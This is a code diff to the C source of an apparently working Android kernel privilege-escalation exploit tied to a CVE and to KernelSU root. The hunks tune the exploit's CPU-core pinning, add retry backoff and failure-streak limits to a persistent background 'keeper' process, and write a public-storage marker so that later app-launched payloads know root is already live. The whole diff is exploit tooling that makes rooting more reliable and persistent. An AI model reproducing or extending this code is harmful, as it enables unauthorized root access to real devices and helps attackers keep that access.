@@ -201,6 +201,9 @@ static pid_t spawn_allocation_keeper(void) {
   syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
   syscall(SYS_prctl, PR_SET_NAME, "cve43499-hold", 0, 0, 0);
   syscall(SYS_setsid);
+  /* Background actor: keep off the LITTLE cluster; walt may place it on
+   * any big perf core. The prime core stays reserved for the exploit. */
+  pin_perf_mask();
 
   int null_fd = (int)syscall(
       SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
@@ -236,6 +239,11 @@ static pid_t spawn_allocation_keeper(void) {
     .tv_nsec = 0,
   };
   int backoff = 0;
+  /* Failed-apply streak guard: a persistently failing environment must
+   * degrade to a long cooldown instead of retrying every minute forever.
+   * Combined with the apply script's no-zygote-kill-on-failure contract,
+   * this is what prevents soft-reboot loops from ever starting. */
+  int fail_streak = 0;
 
   for (;;) {
     syscall(SYS_nanosleep, &tick, NULL);
@@ -243,11 +251,17 @@ static pid_t spawn_allocation_keeper(void) {
       backoff--;
       continue;
     }
-    if (!ksu_module_loaded()) {
+    if (!ksu_active_this_boot()) {
       continue;
     }
+    /* Publish a boot-scoped active marker on public storage so later
+     * app-domain payload invocations (whose policy may deny reading
+     * /proc/modules) can detect that root is already live and skip the
+     * exploit instead of re-running it after a zygote restart. */
+    ksu_sd_marker_write();
     if (modules_done_this_boot()) {
       syscall(SYS_nanosleep, &hold, NULL);
+      continue;
     }
     int lock_fd = activation_lock_acquire();
     if (lock_fd < 0) {
@@ -264,10 +278,18 @@ static pid_t spawn_allocation_keeper(void) {
         int status = 0;
         while (waitpid(ap, &status, 0) < 0 && errno == EINTR) {
         }
-        if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
+        int rc = WIFEXITED(status) ? WEXITSTATUS(status) : 1;
+        if (rc == 0) {
           mark_modules_done();
+          fail_streak = 0;
+        } else if (rc == 42) {
+          /* Boot not completed yet; retry sooner but do not count it as a
+           * hard failure. */
+          fail_streak = 0;
+          backoff = 24;
         } else {
-          backoff = 12;
+          fail_streak++;
+          backoff = fail_streak >= 5 ? 360 : 12;
         }
       } else {
         backoff = 6;
@@ -483,6 +505,11 @@ int run_exploit(int argc, char **argv) {
   init_ashmem_path();
 
   pin_to_core(CORE);
+  {
+    char affinity_desc[160];
+    affinity_describe(affinity_desc, sizeof(affinity_desc));
+    pr_success("cpu map %s\n", affinity_desc);
+  }
 #if defined(SLIDE_STACK_WRITER) && \
     defined(SLIDE_STACK_WRITER_SIGRETURN) && \
     SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
